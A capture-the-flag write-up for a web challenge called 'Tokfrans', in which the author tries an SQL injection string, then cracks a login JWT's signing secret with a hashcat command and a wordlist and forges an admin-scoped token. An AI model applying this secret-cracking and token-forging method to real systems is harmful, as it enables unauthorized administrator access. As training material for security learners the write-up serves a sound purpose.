# Write-up of the challenge "Tokfrans"

This challenge is part of the "Web" category and is worth 450 points.

# Goal of the challenge

So when we visit the website we are asked to login. In the descriptation of the challenge they mention that the username is "zeke" and the password is "irule42" for a certain user.


## Problem

So the problem I faced is what do I start with to know what vulnerability we are facing. I suspected at first like my sql injections so I started doing some like "**'OR1=1--**", but that did not work.

## Security breach

After some time investigating I found something really interesting when I logged into the zeke user which was the web had this **"JSON WEBTOKEN"**: **"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiemVrZSIsInNjb3BlcyI6WyJ1c2VyIl0sInNwZWVkIjo5MDAwLCJncm95IjoiYjliSUFXMUZseUtjUUd5ZWZ1REwzRjRvcjF6aDBzUlBGOTNSN24wOSIsImV4cCI6MTc2NjI2MzcwOX0.2wBNMVUXtnYvFs7h3tVIyKE1KLjfI6PrgIrgmBc8yiY"**. Json webtoken are generally not bad unless you put the secret key to something that's common, then it becomes a big vulnerability!
 
## Solution
So my idea was basically to bruteforce the **"JSON WEBTOKEN"** and find the secret key. I also found out when trying to decode the json token is that the payload is in this format:

```js
{
  "user": "zeke",
  "scopes": [
    "user"
  ],
  "speed": 9000,
  "groy": "b9bIAW1FlyKcQGyefuDL3F4or1zh0sRPF93R7n09",
  "exp": 1766263709
}
```

So I cracked it using hashcat and found out that the secret is **"queenoftherabbitkillers"**.
```
hashcat -m 16500 jwt.txt ../rockyou.txt

queenoftherabbitkillers

```

Now finally after that we can craft our payload and change our scopes from user to admin. The site I used to decode and encode payload is this **"https://www.jwt.io"**

```js
{
  "user": "zeke",
  "scopes": [
    "admin"
  ],
  "speed": 9000,
  "groy": "b9bIAW1FlyKcQGyefuDL3F4or1zh0sRPF93R7n09",
  "exp": 1766263709
}
```


If you liked this writeup you can star my repository.